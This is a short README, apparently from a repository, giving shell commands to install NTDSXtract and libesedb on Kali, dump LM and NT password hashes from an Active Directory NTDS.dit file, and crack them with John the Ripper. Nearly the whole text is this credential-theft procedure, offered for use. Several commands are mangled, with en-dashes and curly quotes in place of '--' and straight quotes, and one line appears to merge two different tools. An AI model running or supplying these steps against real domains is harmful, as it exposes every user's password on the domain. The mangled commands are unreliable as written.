# ntds-tools
Tools for NTDS.dit

https://govolution.wordpress.com/2016/04/13/ntds-cracking-with-kali/

https://gist.github.com/ddouhine/018ac4a8c95498101e7f

##Installation on Kali

wget http://ptscripts.googlecode.com/svn/trunk/dshashes.py

wget http://pkgs.fedoraproject.org/repo/pkgs/libesedb/libesedb-alpha-20120102.tar.gz/198a30c98ca1b3cb46d10a12bef8deaf/libesedb-alpha-20120102.tar.gz

tar -zxf libesedb-alpha-20120102.tar.gz

cd libesedb-20120102/

./configure && make && sudo make install

wget http://ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip

unzip ntdsxtract_v1_0.zip

##Extract Hashes

/root/Downloads/ntds/libesedb-20120102/esedbtools/esedbexport ntds.dit

python /root/Downloads/ntds/NTDSXtract\ 1.0/dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.7

./hashdumpwork –passwordhashes SYSTEM –lmoutfile ./lm-out.txt –ntoutfile ./nt-out.txt –pwdformat ophc > dsusers.results

grep -A 2 “Password hashes:” dsusers.results |grep -v “Password hashes” |grep -v ‘Record ID’|grep -v “\-\-” |sort|uniq > allHashes

grep ‘\$NT\$’ allHashes | sed ‘s/.\(.*\)/\1/’ > NTHashes

grep -v ‘\$NT\$’ allHashes | sed ‘s/.\(.*\)/\1/’ > LMHashes

##Cracking

john –fork=8 NTHashes
